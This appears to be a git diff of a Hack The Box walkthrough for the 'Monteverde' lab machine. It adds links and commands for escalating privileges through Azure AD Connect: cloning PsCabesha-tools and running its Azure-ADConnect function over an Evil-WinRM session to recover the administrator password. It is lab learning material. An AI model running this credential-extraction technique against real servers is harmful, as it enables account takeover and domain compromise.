@@ -4,7 +4,7 @@ title: Hackthebox Monteverde Walkthrough
 categories: HackTheBox
 ---
 
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-06-20/monteverde.png)
+![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2020-07-06/monteverde.png)
 
 # Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
@@ -279,7 +279,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-
+Also, we can see that we have `Azure AD connect` installed.
 ```shell
 *Evil-WinRM* PS C:\Program Files> ls
 
@@ -316,6 +316,8 @@ d-----         1/3/2020   5:28 AM                WindowsPowerShell
 *Evil-WinRM* PS C:\Program Files> 
 ```
 
+We can take a look at [this post](https://blog.xpnsec.com/azuread-connect-for-redteam/) for privilege escalation to gain the admin account using `Azure AD connect`.<br>
+Or we can use [this script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1).<br>
 On the local host, clone `PsCabesha-tools` repository.
 ```shell
 root@kali:~# git clone https://github.com/Hackplayers/PsCabesha-tools.git
@@ -350,7 +352,7 @@ Mode                LastWriteTime         Length Name
 
 ```
 
-Import the module and execute. We can achieve a password for the user `administrator`.
+Import the module and execute the function `Azure-ADConnect`. We can achieve a password for the user `administrator`.
 ```shell
 *Evil-WinRM* PS C:\Users\mhope\Documents> import-module ./Azure-ADConnect.ps1
 *Evil-WinRM* PS C:\Users\mhope\Documents> Azure-ADConnect -server 127.0.0.1 -db ADSync
